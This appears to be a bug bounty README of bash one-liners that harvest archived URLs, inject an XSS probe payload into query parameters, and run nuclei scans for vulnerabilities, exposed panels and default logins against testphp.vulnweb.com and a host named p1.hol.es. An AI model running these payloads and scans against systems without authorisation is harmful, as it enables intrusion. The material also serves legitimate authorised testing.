# SIMPLE ONE LINER
One Liner for Bug Bounty Hunting by `RootBakar`

### Command 1:
```bash
echo "testphp.vulnweb.com" | waybackurls | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/1c80107a-708f-461e-8af7-44f323d6082d">

### Command 2:
```bash
echo "testphp.vulnweb.com" | gau --fc 200 | urldedupe -s -qs | gf lfi redirect sqli-error sqli ssrf ssti xss xxe | qsreplace FUZZ | grep FUZZ | nuclei -silent -t ~/nuclei-templates/dast/vulnerabilities -dast
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/3ec661fb-63f3-4d75-a3e3-c163ac96c506">

### Command 3:
```bash
echo "testphp.vulnweb.com" | gau --fc 200 | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/40e8eb4a-8360-4c3f-9421-ceece6e0a5ba">

### Command 4:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/exposed-panels
```
### Result:
<img width="1045" alt="image" src="https://github.com/user-attachments/assets/146d68a0-fc55-4cc6-9d26-b2acd922e976">

### Command 5:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/exposures
```
### Result:
<img width="1045" alt="image" src="https://github.com/user-attachments/assets/d295f119-d93f-40dd-bc87-6def98789081">

### Command 6:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/default-logins
```
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/default-logins
```
### Result:
<img width="1417" alt="image" src="https://github.com/user-attachments/assets/231d6c59-1586-4b00-9ea2-106a02310502">

### Command 7:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/vulnerabilities/wordpress
```
### Result:
<img width="1211" alt="image" src="https://github.com/user-attachments/assets/e4cf7527-bcba-4b5f-a43e-c470912dce4f">

### Command 8:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/vulnerabilities/
```
### Result:
<img width="1211" alt="image" src="https://github.com/user-attachments/assets/e13e9520-c410-48d0-8c3d-2b882b21e2b8">







